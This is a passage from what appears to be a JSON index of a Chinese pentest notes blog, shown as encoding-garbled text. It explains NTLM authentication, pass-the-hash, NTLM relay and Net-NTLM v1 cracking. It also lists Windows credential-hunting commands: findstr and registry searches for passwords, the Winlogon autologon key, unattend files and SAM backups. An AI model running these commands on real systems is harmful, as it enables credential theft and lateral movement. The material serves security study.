å›¾æ¦‚æ‹¬ä¸€ä¸‹ï¼š\n2.åŸŸç¯å¢ƒä¸‹çš„NTLMè®¤è¯ ä¸å·¥ä½œç»„ç¯å¢ƒä¸åŒï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰åŸŸç”¨æˆ·çš„Hashéƒ½å­˜å‚¨äºåŸŸæ§çš„NTDS.ditä¸­ï¼Œæ‰€ä»¥æœåŠ¡å™¨æœ¬èº«æ— æ³•è®¡ç®—responseè¿›è¡ŒéªŒè¯ï¼Œæ‰€ä»¥éœ€è¦ä¸åŸŸæ§å»ºç«‹å®‰å…¨é€šé“ï¼Œé€šè¿‡åŸŸæ§å®Œæˆæœ€ç»ˆçš„è®¤è¯æµç¨‹\næ­¥éª¤å¦‚ä¸‹ï¼š\nType1åŒå·¥ä½œç»„ç¯å¢ƒ Type2åŒå·¥ä½œç»„ç¯å¢ƒ Type3åŒå·¥ä½œç»„ç¯å¢ƒ æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„Type3æ¶ˆæ¯åï¼Œé€šè¿‡Netlogonåè®®ä¸åŸŸæ§å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ï¼Œå°†éªŒè¯æ¶ˆæ¯è½¬å‘ç»™åŸŸæ§ åŸŸæ§æ ¹æ®Type 3æ¶ˆæ¯ä¸­çš„ç”¨æˆ·åï¼Œåœ¨NTDS.ditä¸­è·å–ç”¨æˆ·çš„NTLM Hashå¯¹challengeè¿›è¡ŒåŠ å¯†å¾—åˆ°responseï¼Œå°†å…¶ä¸Type 3æ¶ˆæ¯ä¸­çš„responseè¿›è¡Œå¯¹æ¯”ï¼Œè‹¥ä¸€è‡´ï¼Œåˆ™å¯†ç æ­£ç¡®ï¼Œè®¤è¯æˆåŠŸï¼Œåä¹‹åˆ™å¤±è´¥ æœåŠ¡ç«¯æ ¹æ®åŸŸæ§è¿”å›çš„ç»“æœï¼Œå¯¹å®¢æˆ·ç«¯è¿›è¡Œç›¸åº”çš„å›å¤ ç”»ä¸€å¼ å›¾æ¥æè¿°ï¼š\n3.NTLM v1ä¸NTLM v2çš„åŒºåˆ« NTLMåè®®æœ‰NTLM v1å’ŒNTLM v2ä¸¤ä¸ªç‰ˆæœ¬ï¼Œç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯NTLM v2ï¼Œä¸¤è€…æœ€æ˜¾è‘—çš„åŒºåˆ«æ˜¯Challengeå€¼å’ŒåŠ å¯†ç®—æ³•ä¸åŒï¼Œå…±åŒä¹‹å¤„æ˜¯éƒ½æ˜¯ç”¨NTLM Hashè¿›è¡ŒåŠ å¯†ã€‚å¦å¤–ï¼ŒNTLM v2å­˜åœ¨ä¸€ä¸ªæ‰©å±•ç‰ˆæœ¬NTLM v2 Sessionï¼Œå¼ºåŒ–äº†å¯¹ä¼šè¯å®‰å…¨æ€§çš„æ”¯æŒ\nchallengeå€¼ï¼š NTLM v1ï¼š8B NTLM v2ï¼š16B Net-NTLM Hashä½¿ç”¨çš„åŠ å¯†ç®—æ³• NTLM v1ï¼šDESåŠ å¯†ç®—æ³• NTLM v2ï¼šHMAC-MD5åŠ å¯†ç®—æ³• Net-NTLM Hash v1å’ŒNet-NTLM Hash v2çš„æ„æˆæ ¼å¼å¦‚ä¸‹ï¼š\n# Net-NTLM Hash v1 username::hostname:LM response:NTLM response:challenge # Net-NTLM Hash v2 username::domain:challenge:HMAC-MD5:blob é€šè¿‡ Mimikatz æ“ä½œ LSASS æŠ“å–NTLM Hashçš„æ“ä½œå—åˆ°äº† Windows 10ä¼ä¸šç‰ˆå’Œ Windows Server 2016ä¸­çš„å‡­è¯ä¿æŠ¤çš„é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨å·¥å…·InternalMonologue.exeåœ¨ä¸æ¥è§¦ lsass.exeè¿›ç¨‹çš„æƒ…å†µä¸‹æŠ“å–Net-NTLM Hash v1å¹¶è½¬æ¢ä¸ºç›¸åº”çš„NTLM Hash\n4.LmCompatibilityLevel LmCompatibilityLevelå€¼ç”¨æ¥ç¡®å®šç½‘ç»œç™»å½•ä½¿ç”¨çš„è´¨è¯¢/å“åº”èº«ä»½éªŒè¯åè®®ã€‚è¯¥é€‰é¡¹ä¼šå½±å“å®¢æˆ·ç«¯ä½¿ç”¨çš„èº«ä»½éªŒè¯åè®®çš„ç­‰çº§ã€åå•†çš„ä¼šè¯å®‰å…¨çš„ç­‰çº§ä»¥åŠæœåŠ¡å™¨æ¥å—çš„èº«ä»½éªŒè¯çš„ç­‰çº§ï¼Œå…¶å€¼å¯¹åº”å«ä¹‰å¦‚ä¸‹è¡¨ï¼š\nLmCompatibilityLevelå€¼çš„ä¿®æ”¹é€šå¸¸æœ‰ä¸¤ç§æ–¹æ³•ï¼š\næ‰‹åŠ¨ä¿®æ”¹æœ¬åœ°å®‰å…¨ç­–ç•¥ å‘½ä»¤ä¿®æ”¹æ³¨å†Œè¡¨lmcompatibilitylevelçš„å€¼ äº”ã€NTLMåè®®çš„å®‰å…¨é—®é¢˜ ä»NTLMè®¤è¯çš„æµç¨‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨Type 3è®¤è¯æ¶ˆæ¯ä¸­æ˜¯ä½¿ç”¨ç”¨æˆ·å¯†ç çš„HTLM Hashè¿›è¡Œresponseæ¶ˆæ¯çš„è®¡ç®—çš„ï¼Œå› æ­¤ï¼Œåœ¨æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·å¯†ç çš„æ˜æ–‡è€Œåªæ‹¿åˆ°Hashçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿›è¡ŒPTHï¼ˆPass The Hashï¼Œå“ˆå¸Œä¼ é€’ï¼‰æ”»å‡»ã€‚åŒæ ·ï¼Œåœ¨Type 3æ¶ˆæ¯ä¸­è¿˜å­˜åœ¨Net-NTLM Hashï¼Œå½“è·å¾—äº†Net-NTLM Hashåï¼Œå¯ä»¥è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œé‡æ”¾Net-NTLM Hashï¼Œå³NTLM Relayï¼ˆNTLM ä¸­ç»§ï¼‰æ”»å‡»ã€‚ç”±äºNTLM v1åè®®åŠ å¯†è¿‡ç¨‹å­˜åœ¨å¤©ç„¶ç¼ºé™·ï¼Œå› æ­¤å¯ä»¥å¯¹Net-NTLM v1 Hashè¿›è¡Œç ´è§£ï¼Œå¾—åˆ°NTLM Hashä¹‹åå³å¯æ¨ªå‘ç§»åŠ¨\nï¼ˆæœ¬æ–‡åªå¯¹å®‰å…¨é—®é¢˜ç¨ä½œä»‹ç»ï¼Œåç»­å¦å†™æ–‡ç« è¯¦ç»†ç ”ç©¶ï¼‰\n1.pass the hash å“ˆå¸Œä¼ é€’æ”»å‡»æ˜¯å†…ç½‘æ¨ªå‘ç§»åŠ¨çš„ä¸€ç§æ–¹å¼ï¼Œå› ä¸ºNTLMè®¤è¯è¿‡ç¨‹ä¸­æ˜¯ä½¿ç”¨ç”¨æˆ·å¯†ç çš„NTLM Hashæ¥å¯¹challengeè¿›è¡ŒåŠ å¯†ä»è€Œå¾—åˆ°responseï¼Œæ‰€ä»¥å½“è·å–åˆ°ç”¨æˆ·çš„HTLM Hashè€Œæœªè§£å‡ºæ˜æ–‡å¯†ç æ—¶ï¼Œå¯ä»¥åˆ©ç”¨è¯¥NTLM Hashè¿›è¡ŒPTHæ”»å‡»ï¼Œå¯¹å†…ç½‘å…¶ä»–æœºå™¨è¿›è¡ŒHashç¢°æ’ï¼Œç¢°æ’åˆ°ä½¿ç”¨ç›¸åŒå¯†ç çš„ä¸»æœºå³å¯é€šè¿‡135æˆ–445ç«¯å£è¿›è¡Œæ¨ªå‘ç§»åŠ¨\n2.NTLM Relay ä¸¥æ ¼æ¥çœ‹ï¼ŒNTLM Relayçš„ç§°æ³•å¹¶ä¸å‡†ç¡®ï¼Œè€Œåº”è¯¥å«Net-NTLM Relayã€‚ä½œä¸ºä¸­é—´äººï¼Œæ”»å‡»è€…å°†æ¥è‡ªå®¢æˆ·ç«¯çš„ type 1 æ¶ˆæ¯è½¬å‘ç»™æœåŠ¡ç«¯ï¼Œå°†æ¥è‡ªæœåŠ¡ç«¯çš„ type 2 æ¶ˆæ¯è½¬å‘ç»™å®¢æˆ·ç«¯ï¼Œè€Œæ”»å‡»å‘ç”Ÿåœ¨NTLMè®¤è¯çš„ç¬¬ä¸‰æ­¥ï¼Œå› ä¸º type 3 æ¶ˆæ¯ä¸­å­˜åœ¨å®¢æˆ·ç«¯è®¡ç®—å¥½çš„Net-NTLM Hashï¼Œæ‰€ä»¥åœ¨è·å–åˆ° type 3 æ¶ˆæ¯åï¼Œä¸­é—´äººç›´æ¥å°†å…¶è½¬å‘ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯éªŒè¯é€šè¿‡åï¼Œä¼šæˆäºˆæ”»å‡»è€…è®¿é—®çš„æƒé™ï¼Œè€Œä¸æˆäºˆå®¢æˆ·ç«¯\nå¯ç”¨å›¾ç‰‡æ¦‚æ‹¬ä¸Šè¿°è¿‡ç¨‹ï¼š\n3.Net-NTLM v1 Hashç ´è§£ ç”±äºNTLM v1èº«ä»½è®¤è¯åè®®åŠ å¯†è¿‡ç¨‹å­˜åœ¨å¤©ç„¶ç¼ºé™·ï¼Œåªè¦è·å–åˆ°Net-NTLM v1 Hashï¼Œå°±èƒ½ç ´è§£ä¸ºNTLM Hashï¼Œè¿™ä¸å¯†ç å¼ºåº¦æ— å…³ã€‚åœ¨åŸŸç¯å¢ƒä¸­ï¼Œè¯¥ç¼ºé™·æ›´ä¸ºçªå‡ºï¼Œå› ä¸ºåœ¨åŸŸä¸­ä½¿ç”¨Hashå³å¯è¿œç¨‹è¿æ¥ç›®æ ‡æœºå™¨ã€‚è‹¥åŸŸæ§å…è®¸å‘é€NTLM v1å“åº”ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸åŸŸæ§æœºå™¨è¿›è¡ŒNTLMè®¤è¯ï¼Œç„¶åæŠ“å–åŸŸæ§çš„Net-NTLM v1 Hashï¼Œç ´è§£ä¸ºNTLM Hashã€‚ä½¿ç”¨åŸŸæ§çš„æœºå™¨è´¦æˆ·å’ŒHashå³å¯å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·Hashï¼ˆè‡ªä»Windows Vistaå¼€å§‹ï¼Œå¾®è½¯å°±é»˜è®¤ä½¿ç”¨NTLM v2èº«ä»½è®¤è¯åè®®ï¼Œè¦æƒ³é™çº§åˆ°NTLM v1çš„è¯ï¼Œéœ€è¦æ‰‹åŠ¨è¿›è¡Œä¿®æ”¹ï¼Œå¹¶ä¸”éœ€è¦ç›®æ ‡ä¸»æœºçš„ç®¡ç†å‘˜æƒé™æ‰èƒ½è¿›è¡Œæ“ä½œï¼‰\n",
        "summary": "Windowsåè®®ä¹‹NTLM NTLMåè®®ï¼ˆNew Technology LAN Managerï¼‰åè®®æ˜¯å¾®è½¯ç”¨äºWindowsèº«ä»½éªŒè¯çš„ä¸»è¦åè®®ä¹‹ä¸€\næ—©æœŸSMBåè®®ä»¥æ˜æ–‡å£ä»¤çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€’ï¼Œå­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œè¿›è€Œå‡ºç°äº†LMï¼ˆLAN managerï¼‰åè®®ï¼Œç„¶è€Œè¯¥åè®®å› ä¸ºå¤ªç®€å•ï¼Œè¿˜æ˜¯å®¹æ˜“è¢«ç ´è§£ï¼Œå¾®è½¯è¿›è€Œæå‡ºäº†NTLMåè®®\nNTLMåè®®æ—¢å¯ç”¨äºå·¥ä½œç»„ç¯å¢ƒä¸­çš„æœºå™¨èº«ä»½éªŒè¯ï¼Œåˆå¯ç”¨äºåŸŸç¯å¢ƒèº«ä»½éªŒè¯ï¼Œè¿˜å¯ä»¥ä¸º SMBã€HTTPã€LDAPã€SMTP ç­‰ä¸Šå±‚å¾®è½¯åº”ç”¨æä¾›èº«ä»½éªŒè¯\nå€¼å¾—ä¸€æçš„æ˜¯ï¼šNTLMæ˜¯åº•å±‚çš„è®¤è¯åè®®ï¼Œå¿…é¡»åµŒå…¥ä¸Šå±‚åº”ç”¨åè®®ä¸­ï¼Œæ¶ˆæ¯çš„ä¼ è¾“ä¾èµ–äºä½¿ç”¨NTLMçš„ä¸Šå±‚åè®®ï¼Œæ¯”å¦‚SMBã€HTTPç­‰\nä¸€ã€SSPIä¸SSPçš„æ¦‚å¿µ 1.SSPI SSPIï¼ˆSecurity Service Provider Interfaceï¼Œå®‰å…¨æœåŠ¡æä¾›æ¥å£ï¼‰æ˜¯windowså®šä¹‰çš„ä¸€å¥—æ¥å£ï¼Œè¯¥æ¥å£å®šä¹‰äº†ä¸å®‰å…¨æœ‰å…³çš„åŠŸèƒ½å‡½æ•°ï¼ŒåŒ…å«ä½†ä¸é™äºï¼š\nèº«ä»½éªŒè¯æœºåˆ¶ ä¸ºå…¶ä»–åè®®æä¾›çš„session securityï¼ˆä¼šè¯å®‰å…¨ï¼‰æœºåˆ¶ï¼Œä¼šè¯å®‰å…¨å¯ä¸ºé€šä¿¡æä¾›æ•°æ®çš„å®Œæ•´æ€§æ ¡éªŒä»¥åŠæ•°æ®çš„åŠ å¯†ã€è§£å¯†åŠŸèƒ½ æ³¨æ„ï¼šSSPIåªæ˜¯å®šä¹‰äº†ä¸€å¥—æ¥å£å‡½æ•°ï¼Œå¹¶æ²¡æœ‰å®ç°å…·ä½“å†…å®¹\n2.SSP SSPï¼ˆSecurity Service Providerï¼Œå®‰å…¨æœåŠ¡æä¾›è€…ï¼‰æ˜¯SSPIçš„å®ç°è€…ï¼Œå¾®è½¯è‡ªå·±å®ç°äº†å¾ˆå¤šSSPï¼Œç”¨äºæä¾›å®‰å…¨åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š\nNTLM SSPï¼šWindows NT 3.51ä¸­å¼•å…¥ï¼ˆmsv1_0.dllï¼‰ï¼Œä¸ºWindows 2000ä¹‹å‰çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸå’ŒéåŸŸèº«ä»½éªŒè¯ï¼ˆSMB/CIFSï¼‰æä¾› NTLM è´¨è¯¢/å“åº”èº«ä»½éªŒè¯ Kerberos SSPï¼šWindows 2000ä¸­å¼•å…¥ï¼ŒWindows vistaä¸­æ›´æ–°ä¸ºæ”¯æŒAESï¼ˆkerberos.dllï¼‰ï¼ŒWindows 2000åŠæ›´é«˜ç‰ˆæœ¬ä¸­é¦–é€‰çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åŸŸç›¸äº’èº«ä»½éªŒè¯ Digest SSPï¼šWindows XPä¸­å¼•å…¥ï¼ˆwdigest.dllï¼‰ï¼Œåœ¨ Windows ä¸ kerberos ä¸å¯ç”¨çš„éWindowsç³»ç»Ÿé—´æä¾›åŸºäº HTTP å’Œ SASL èº«ä»½éªŒè¯çš„è´¨è¯¢/å“åº” Negotiate SSP:Windows 2000 ä¸­å¼•å…¥ï¼ˆsecur32.dll) ï¼Œé»˜è®¤é€‰æ‹© Kerberosï¼Œå¦‚æœä¸å¯ç”¨åˆ™é€‰æ‹© NTLM åè®®ã€‚Negotiate SSP æä¾›å•ç‚¹ç™»å½•èƒ½åŠ›ï¼Œæœ‰æ—¶ç§°ä¸ºé›†æˆ Windows èº«ä»½éªŒè¯ï¼ˆå°¤å…¶æ˜¯ç”¨äº IIS æ—¶)ã€‚åœ¨ Windows 7 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒNEGOExts å¼•å…¥äº†åå•†ä½¿ç”¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸Š æ”¯æŒçš„å·²å®‰è£…å®šåˆ¶ SSP è¿›è¡Œèº«ä»½éªŒè¯ Cred SSP:Windows Vista ä¸­å¼•å…¥ï¼ŒWindows XP SP3 ä¸Šä¹Ÿå¯ç”¨ ï¼ˆcredssp.dll)ï¼Œä¸ºè¿œç¨‹æ¡Œé¢è¿æ¥æä¾›å•ç‚¹ç™»å½•ï¼ˆSSO)å’Œç½‘ç»œçº§èº«ä»½éªŒè¯ Schannel SSP:Windows 2000 ä¸­å¼•å…¥ï¼ˆSchannel.dll)ï¼ŒWindows Vista ä¸­ æ›´æ–°ä¸ºæ”¯æŒæ›´å¼ºçš„ AES åŠ å¯†å’Œ ECC[6] è¯¥æä¾›è€…ä½¿ç”¨ SSL/TLS è®°å½•æ¥åŠ å¯†æ•°æ®æœ‰æ•ˆè½½è· PKU2U SSP:Windows 7 ä¸­å¼•å…¥ï¼ˆpku2u.dll) ï¼Œ åœ¨ä¸éš¶å±åŸŸçš„ç³»ç»Ÿä¹‹é—´æä¾›ä½¿ç”¨æ•°å­—è¯ä¹¦çš„å¯¹ç­‰èº«ä»½éªŒè¯ å› ä¸ºSSPIä¸­å®šä¹‰äº†ä¸session securityæœ‰å…³çš„APIï¼Œæ‰€ä»¥ä¸Šå±‚åº”ç”¨åˆ©ç”¨ä»»ä½•SSPä¸è¿œç¨‹çš„æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯åï¼Œæ­¤SSPéƒ½ä¼šä¸ºæœ¬æ¬¡è¿æ¥ç”Ÿæˆä¸€ä¸ªéšæœºkeyï¼Œè¿™ä¸ªkeyè¢«ç§°ä¸ºsession keyã€‚ä¸Šå±‚åº”ç”¨ç»è¿‡èº«ä»½éªŒè¯åï¼Œå¯ä»¥é€‰æ‹©æ€§çš„ä½¿ç”¨è¿™ä¸ªkeyå¯¹ä¹‹åå‘å¾€æœåŠ¡ç«¯æˆ–æ¥æ”¶è‡ªèº«æœåŠ¡ç«¯çš„æ•°æ®è¿›è¡Œç­¾åæˆ–åŠ å¯†\n"
    }
,
    {
        "title": "windowså¯†ç æ“ä½œ",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C/",
        "content": "æƒé™æå‡-windowså¯†ç æ“ä½œ å¯†ç æœç´¢ å¯†ç æœç´¢å±äºä¿¡æ¯æœé›†çš„ä¸€éƒ¨åˆ†ï¼Œå¾ˆå¤šç”¨æˆ·å–œæ¬¢å°†è‡ªå·±çš„ç½‘ç«™ã€é‚®ç®±ã€åº”ç”¨ç¨‹åºè®¾ç½®åŒä¸€ä¸ªå¯†ç ï¼Œå¯ä»¥æ‰§è¡Œå„ç±»å‘½ä»¤æ¥æœç´¢ç³»ç»Ÿå†…å­˜å‚¨å¯†ç çš„é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ç»„åˆæ”¶é›†åˆ°çš„å¯†ç æ¥å°è¯•ç™»é™†é«˜æƒé™è´¦æˆ·ï¼Œå¯èƒ½è¾¾åˆ°æƒé™æå‡æˆ–æ¨ªå‘ç§»åŠ¨çš„ç›®çš„\næ–‡ä»¶ä¸­çš„å¯†ç æœç´¢ æœç´¢æ–‡ä»¶å†…å®¹ æœç´¢æ–‡ä»¶å†…å®¹é‡ŒåŒ…æ‹¬â€œpasswordâ€å­—ç¬¦ä¸²çš„txtæ–‡ä»¶ï¼š\nfindstr /SI /M \u0026#34;password\u0026#34; *.txt ä¹Ÿå¯ä»¥å¢åŠ å…¶ä»–æ–‡ä»¶çš„æ ¼å¼ï¼š\nfindstr /SI /M \u0026#34;password\u0026#34; *.txt *.ini *.config å‚æ•°/SIï¼šåœ¨å½“å‰ç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ä¸­æœç´¢æŒ‡å®šæ–‡ä»¶ï¼Œ æŒ‡å®šæœç´¢éƒ¨åˆ†å¤§å°å†™ å‚æ•°/Mï¼šå¦‚æœæœç´¢åˆ°ç›¸å…³çš„æ–‡ä»¶ï¼Œåˆ™åªåˆ—å‡ºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ å†ä½¿ç”¨â€œtype + ç›®æ ‡æ–‡ä»¶è·¯å¾„â€å‘½ä»¤æ¥è·å–æ–‡ä»¶å†…å®¹\nå¦‚æœä¸æ·»åŠ å‚æ•°/Mï¼Œåˆ™ä¼šåˆ—å‡ºåŒ…å«ç›®æ ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰æ–‡ä»¶å’Œå†…å®¹ï¼Œä¼šæ˜¾å¾—æ¯”è¾ƒæ‚ä¹±\næœç´¢æ–‡ä»¶å æœç´¢å½“å‰ç›®å½•åŠå­ç›®å½•ä¸­æ–‡ä»¶ååŒ…å«å­—ç¬¦ä¸²â€œpasswordâ€çš„æ–‡ä»¶ï¼š\ndir /s *password* powershellå‘½ä»¤ï¼š\nGet-ChildItem \u0026lt;æ–‡ä»¶å¤¹è·¯å¾„\u0026gt; -Include *password.txt* -recurse cmdå‘½ä»¤åˆ‡æ¢åˆ°å…¶ä»–ç›®å½•å¹¶æœç´¢æ–‡ä»¶åä¸­åŒ…å«web.configçš„æ–‡ä»¶ï¼š\ncd /d E: \u0026amp;\u0026amp; dir /b /s web.config ç”¨forå‘½ä»¤æŸ¥æ‰¾æŸç›˜ç¬¦å†…æ–‡ä»¶ååŒ…å«password.txt:\nfor /r \u0026lt;ç›˜ç¬¦\u0026gt; %i in (password.txt) do @echo %i ä¹Ÿå¯ä»¥ä½¿ç”¨whereå‘½ä»¤æ¥æŸ¥æ‰¾è¿™ç§ç±»å‹çš„æ–‡ä»¶ï¼š\nwhere /r C:\\ *password.txt åœ¨æ³¨å†Œè¡¨ä¸­å¯»æ‰¾å¯†ç  è·å–æ³¨å†Œè¡¨æ ¹é”®HKCUä¸‹åŒ…å«â€œpasswordâ€å­—ç¬¦ä¸²çš„å…¨éƒ¨å†…å®¹ï¼š\nreg query HKCU /f password /t REG_SZ /s ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼Œæˆ–å½“å‰åœ¨webshellä¸­æ“ä½œæ—¶ï¼Œå¯ä»¥å°†ç»“æœä¿å­˜åœ¨æ–‡æœ¬ä¸­ï¼Œä¸‹è½½åå†æŸ¥çœ‹\nreg query HKCU /f password /t REG_SZ /s \u0026gt;temp.txt æ­£å¸¸æƒ…å†µä¸‹ï¼Œæ¯æ¬¡ç™»é™†æœåŠ¡å™¨éƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œä½†æœ‰äº›ç®¡ç†å‘˜ä¸ºäº†æ–¹ä¾¿ï¼Œå¯èƒ½ä¼šè®¾ç½®è‡ªåŠ¨ç™»å½•ï¼Œæ³¨å†Œè¡¨ä¸­ä¼šä¿å­˜è‡ªåŠ¨ç™»å½•çš„è´¦å·å’Œå¯†ç ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å‘½ä»¤è·å–è‡ªåŠ¨ç™»å½•å¯†ç ï¼š\nreg query \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; æ— äººå€¼å®ˆæ–‡ä»¶ æ— äººå€¼å®ˆæ–‡ä»¶ï¼ˆè‡ªåŠ¨åº”ç­”æ–‡ä»¶ï¼‰å¯ç”¨äºåœ¨å®‰è£…ç³»ç»Ÿå‰ä¿®æ”¹é•œåƒä¸­çš„windowsè®¾ç½®\nç®¡ç†å‘˜åœ¨å®‰è£…ç³»ç»Ÿå‰ä¿®æ”¹é•œåƒï¼Œèƒ½å¤ŸæŠŠæƒ³è¦è‡ªå®šä¹‰çš„å†…å®¹æå‰é…ç½®å¥½ï¼Œä¾‹å¦‚ï¼š\nç£ç›˜åˆ†åŒº ç³»ç»Ÿç£ç›˜å®‰è£…ä½ç½® äº§å“å¯†é’¥ ç½‘ç»œè®¾ç½® åº”ç”¨ç¨‹åºå®‰è£…ç­‰å„ç§ç½‘ç»œé…ç½® è´¦æˆ·åã€å¯†ç ï¼ˆä¸€èˆ¬ä¸ºæ˜æ–‡æˆ–base64ç¼–ç ï¼‰ï¼Œç”šè‡³æ˜¯æµè§ˆå™¨æ”¶è—å¤¹ã€ ä½¿ç”¨è¿™ç§æ–¹æ³•çš„ä¸€èˆ¬éƒ½æ˜¯å¤§å‹å†…ç½‘ï¼Œå› ä¸ºæ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªåœ°å®‰è£…æ“ä½œç³»ç»Ÿå†è¿›è¡Œé…ç½®æ¯”è¾ƒè€—è´¹æ—¶é—´å’Œç²¾åŠ›ï¼Œä½¿ç”¨æ— äººå€¼å®ˆæ–‡ä»¶æ–¹ä¾¿éƒ¨ç½²\nè¿™ä¸ªæ–‡ä»¶çš„æ‰©å±•åé€šå¸¸ä¸º.xmlï¼Œå¯ä»¥åœ¨ä¸åŒçš„ä½ç½®\næ‰§è¡Œå‘½ä»¤æŸ¥æ‰¾ç³»ç»Ÿä¸­å¯èƒ½å­˜åœ¨çš„æ— äººå€¼å®ˆæ–‡ä»¶ï¼Œä»è¯¥æ–‡ä»¶ä¸­æœç´¢å­˜åœ¨çš„å¯†ç ã€å¯†é’¥ç­‰ä¿¡æ¯ï¼š\ndir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2\u0026gt;null æˆ–æ‰§è¡Œpowershell cmdletå‘½ä»¤\nGet-Childitem -Path C:\\ -Include *unattend* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like \u0026#34;*.xml\u0026#34; -or $_.Name -like \u0026#34;*.txt\u0026#34; -or $_.Name -like \u0026#34;*.ini\u0026#34;)} åœ¨æŸ¥æ‰¾åˆ°çš„ç›®æ ‡xmlæ–‡ä»¶ä¸­ï¼Œå­˜åœ¨PlainTextå­—æ®µï¼š\nè¯¥å­—æ®µçš„å€¼ä¸ºtrueæ—¶ï¼Œè¡¨ç¤ºå¯†ç ä¸ºæ˜æ–‡ è¯¥å­—æ®µçš„å€¼ä¸ºfalseæ—¶ï¼Œè¡¨ç¤ºå¯†ç ä¸ºç»è¿‡base64ç¼–ç  metasploitä¸­çš„æ¨¡å—post/windows/gather/enum_unattendä¹Ÿæ˜¯ç”¨äºæŸ¥æ‰¾æ— äººå€¼å®ˆæ–‡ä»¶çš„ï¼Œå¹¶ä¼šè‡ªåŠ¨å¯¹å¯†ç è¿›è¡Œè§£ç \nå®‰å…¨è´¦æˆ·æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ SAMï¼ˆSecurity Account Managerï¼Œå®‰å…¨è´¦æˆ·ç®¡ç†ï¼‰æ•°æ®åº“ï¼ˆä½ç½®åœ¨%SystemRoot%\\system32\\config\\SAMï¼‰æ˜¯windowsç”¨æˆ·è´¦æˆ·æ•°æ®åº“ï¼Œä¿å­˜ç€windowsç³»ç»Ÿç”¨æˆ·çš„åŠ å¯†å½¢å¼çš„ç™»é™†å¯†ç ï¼Œåœ¨ä¸€äº›æ—§ç‰ˆæœ¬çš„windowsç³»ç»Ÿä¸­ï¼Œå¦‚æœä½¿ç”¨ä¿®å¤åŠŸèƒ½ä¿®å¤è¿‡windowsç³»ç»Ÿï¼Œé‚£ä¹ˆæƒé™é…ç½®ä¸å½“å®‰å…¨è´¦æˆ·æ•°æ®åº“ä¹Ÿæ˜¯å¤‡ä»½çš„ï¼Œå¤‡ä»½æ–‡ä»¶ä¿å­˜åœ¨C:\\WINDOWS\\repair\\æ–‡ä»¶å¤¹ä¸­\nå¦‚æœè¯¥æ–‡ä»¶å¤¹æƒé™é…ç½®ä¸å½“ï¼Œé‚£ä¹ˆå¯ä»¥å°†SAMæ–‡ä»¶å’ŒSYSTEMæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¤åˆ¶åˆ°æ”»å‡»æœºkaiä¸­ï¼Œè¿›è¡Œæå–HASHå’Œçˆ†ç ´HASHçš„æ“ä½œ\nä¾¿ç¬ºä¿¡æ¯ åº”ç”¨ä¸­çš„å¯†ç  powershellå†å²å‘½ä»¤è®°å½• WIFIå¯†ç  å‡­æ®ç®¡ç†å™¨ WSLç³»ç»Ÿ é’ˆå¯¹å¯†ç æ³„éœ²çš„é˜²å¾¡æªæ–½ å¯†ç çªƒå– ä¼ªé€ é”å± ä¼ªé€ è®¤è¯æ¡† è‚©çª¥ é’ˆå¯¹å¯†ç çªƒå–çš„é˜²å¾¡æªæ–½ å¯†ç ç ´è§£ æš´åŠ›ç ´è§£ å­—å…¸ç»„åˆ æ’åº“æ”»å‡» å–·å°„æ”»å‡» é’ˆå¯¹å¯†ç ç ´è§£çš„é˜²å¾¡æªæ–½\n",
        "summary": "æƒé™æå‡-windowså¯†ç æ“ä½œ å¯†ç æœç´¢ å¯†ç æœç´¢å±äºä¿¡æ¯æœé›†çš„ä¸€éƒ¨åˆ†ï¼Œå¾ˆå¤šç”¨æˆ·å–œæ¬¢å°†è‡ªå·±çš„ç½‘ç«™ã€é‚®ç®±ã€åº”ç”¨ç¨‹åºè®¾ç½®åŒä¸€ä¸ªå¯†ç ï¼Œå¯ä»¥æ‰§è¡Œå„ç±»å‘½ä»¤æ¥æœç´¢ç³»ç»Ÿå†…å­˜å‚¨å¯†ç çš„é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ç»„åˆæ”¶é›†åˆ°çš„å¯†ç æ¥å°è¯•ç™»é™†é«˜æƒé™è´¦æˆ·ï¼Œå¯èƒ½è¾¾åˆ°æƒé™æå‡æˆ–æ¨ªå‘ç§»åŠ¨çš„ç›®çš„\næ–‡ä»¶ä¸­çš„å¯†ç æœç´¢ æœç´¢æ–‡ä»¶å†…å®¹ 